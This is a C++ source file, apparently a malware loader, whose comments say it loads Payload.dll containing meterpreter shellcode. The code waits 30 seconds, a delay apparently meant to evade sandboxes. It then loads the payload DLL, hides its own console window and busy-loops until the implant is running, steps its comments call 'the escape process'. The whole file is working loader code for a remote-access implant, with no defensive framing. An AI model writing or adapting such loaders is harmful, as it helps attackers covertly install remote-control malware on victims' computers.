/* Loader.cpp 
   ==========
   This console application loads Payload.dll which contains the main
   meterpreter shellcode to run.     
*/
#include <iostream>
#include <Windows.h>
#include <WinUser.h>
#include<stdio.h>  
HWND GetConsoleHwnd(void)
{
    HWND hwndFound;     
    SetConsoleTitle(L"sneakygeek");
    hwndFound = FindWindow(NULL, L"sneakygeek");
    SetConsoleTitle(L"somethingelse");
    return(hwndFound);
}

int main()
{
    
    HMODULE PayloadDLL;
    HWND hConsole;
    printf("sleeping for 1/2 minute\n");
    printf("--------------------------------------------------------------------------\n");
    Sleep(30000);
    printf("--------------------------------------------------------------------------\n");
    printf("launching  payload.dll...\n");
  //  Sleep(300);
    PayloadDLL = LoadLibrary(L"Payload.dll");
    printf("the payload launched succesfully\n");
    hConsole = GetConsoleHwnd();
    ShowWindow(hConsole, SW_HIDE);
    Sleep(300);
    printf("--------------------------------------------------------------------------\n");
    printf("launching  the escape process\n");
//the original poeny lunched a infinite loop, i triggred the following loop, just to make sure that
//the meterpreter is totally lunced and after that the loader will stop everything and exit 
    for (int i = 0; i < 1500000000; i++)
    {

    }
    printf("--------------------------------------------------------------------------\n");
    printf("the escape process launched succefully");
  
   // Sleep(300);
       
    
//	while (1) {
        // infinite loop to keep thread alive.
//	}
    exit;
}
